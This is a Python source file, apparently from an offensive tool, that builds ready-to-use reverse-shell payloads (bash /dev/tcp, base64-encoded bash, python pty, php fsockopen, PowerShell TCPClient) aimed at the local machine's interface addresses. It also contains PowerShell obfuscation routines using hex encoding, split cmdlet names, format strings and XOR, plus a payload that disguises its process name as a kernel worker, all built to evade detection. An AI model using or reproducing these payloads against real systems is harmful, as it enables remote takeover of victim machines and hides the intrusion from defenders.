from __future__ import annotations

import base64
import random
import re
import subprocess

def _to_ps_hex_str(s: str) -> str:
    hex_bytes = ",".join(f"0x{b:02X}" for b in s.encode())
    return f"([System.Text.Encoding]::UTF8.GetString([byte[]]({hex_bytes})))"

def _ps_hex_obfuscate(payload: str) -> str:
    return re.sub(r"'([^']*)'", lambda m: _to_ps_hex_str(m.group(1)), payload)

_PS_CMDLETS = [
    "Invoke-Expression",
    "New-Object",
    "Out-String",
    "Get-Content",
    "Write-Host",
    "iex",
    "pwd",
]

def _random_split(cmdlet: str) -> str:
    i = random.randint(1, len(cmdlet) - 1)
    p1, p2 = cmdlet[:i], cmdlet[i:]
    q = random.choice(('"', "'"))
    return f'&({q}{p1}{q}+{q}{p2}{q})'

def _ps_syntax_obfuscate(payload: str) -> str:
    result = payload
    for cmdlet in _PS_CMDLETS:
        result = re.sub(
            rf'(?<![.\w]){re.escape(cmdlet)}(?![\w])',
            lambda _, c=cmdlet: _random_split(c),
            result,
        )
    return result

def _format_split(s: str) -> str:
    if len(s) < 2:
        return f"'{s}'"
    n = random.randint(2, min(3, len(s)))
    indices = sorted(random.sample(range(1, len(s)), n - 1))
    parts, prev = [], 0
    for idx in indices:
        parts.append(s[prev:idx])
        prev = idx
    parts.append(s[prev:])
    placeholders = "".join(f"{{{i}}}" for i in range(n))
    parts_str = ",".join(f"'{p}'" for p in parts)
    return f"('{placeholders}' -f {parts_str})"

def _ps_format_obfuscate(payload: str) -> str:
    return re.sub(
        r"'([^']{2,})'",
        lambda m: _format_split(m.group(1)),
        payload,
    )

def _xor_encode_str(s: str) -> str:
    key = random.randint(1, 255)
    var = f"k{random.randint(1000, 9999)}"
    hex_bytes = ",".join(f"0x{(ord(c) ^ key):02x}" for c in s)
    return f"$(${var}={key};$b=[byte[]]({hex_bytes});-join($b|%{{[char]($_-bxor${var})}}))"

def _ps_xor_obfuscate(payload: str) -> str:
    return re.sub(
        r"'([^']{2,})'",
        lambda m: _xor_encode_str(m.group(1)),
        payload,
    )

def get_interfaces() -> dict[str, str]:
    result = {}
    try:
        out = subprocess.check_output(["ip", "-4", "addr", "show"], text=True)
        iface = None
        for line in out.splitlines():
            line = line.strip()
            if line and line[0].isdigit():
                iface = line.split(":")[1].strip().split("@")[0]
            elif line.startswith("inet ") and iface:
                ip = line.split()[1].split("/")[0]
                if ip != "127.0.0.1":
                    result[iface] = ip
    except Exception:
        pass
    return result

def _b64_payload(ip: str, port: int) -> str:
    raw = f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
    return base64.b64encode(raw.encode()).decode()

def _build_payloads(ip: str, port: int) -> dict[str, str]:
    _CMD_PAYLOAD = rf"""
$client=New-Object Net.Sockets.TCPClient('{ip}',{port})
$stream=$client.GetStream()
$writer=New-Object IO.StreamWriter($stream)
$writer.AutoFlush=$true
$reader=New-Object IO.StreamReader($stream)
$cwd='C:\'
while($client.Connected){{
    $writer.Write("$cwd> ")
    $cmd=$reader.ReadLine()
    if($cmd -eq 'exit'){{break}}
    if($cmd -match '^cd\s+(.+)$'){{
        $target=$matches[1].Trim()
        $newpath=cmd /c "cd /d `"$cwd`" && cd `"$target`" && cd"
        if($LASTEXITCODE -eq 0 -and $newpath){{$cwd=$newpath.Trim()}}
        else{{$writer.WriteLine("The system cannot find the path specified.")}}
    }} else {{
        $out=(cmd /c "cd /d `"$cwd`" && $cmd" 2>&1 | Out-String).Trim()
        $writer.WriteLine($out)
    }}
}}
$client.Close()
""".replace('\n', '').replace('    ', '')
    _PS_BASE = f"$client=New-Object Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    return {
        "bash":               f'bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"',
        "bash (alt)":         f'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
        "memfd (bash)":       f'bash <(echo {_b64_payload(ip, port)} | base64 -d)',
        "memfd (spoof argv)": f'exec -a [kworker/0:1] bash <(echo {_b64_payload(ip, port)} | base64 -d)',
        "memfd (sh compat)":  f'bash <(printf %s {_b64_payload(ip, port)} | base64 -d)',
        "python3":            f'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'',
        "python":             f'python -c \'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'',
        "php":                f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/bash -i <&3 >&3 2>&3");\'',
        "powershell":         _PS_BASE,
        "cmd.exe":            f"powershell -nop -ep bypass -c \"{_CMD_PAYLOAD}\"",
    }

class PayloadGenerator:

    def __init__(self, port: int = 4444):
        self.port = port

    def get_interfaces(self) -> dict[str, str]:
        return get_interfaces()

    def for_interface(self, iface: str) -> dict[str, str] | None:
        interfaces = get_interfaces()
        if iface not in interfaces:
            return None
        return _build_payloads(interfaces[iface], self.port)

    def for_all(self) -> dict[str, dict[str, str]]:
        return {
            iface: _build_payloads(ip, self.port)
            for iface, ip in get_interfaces().items()
        }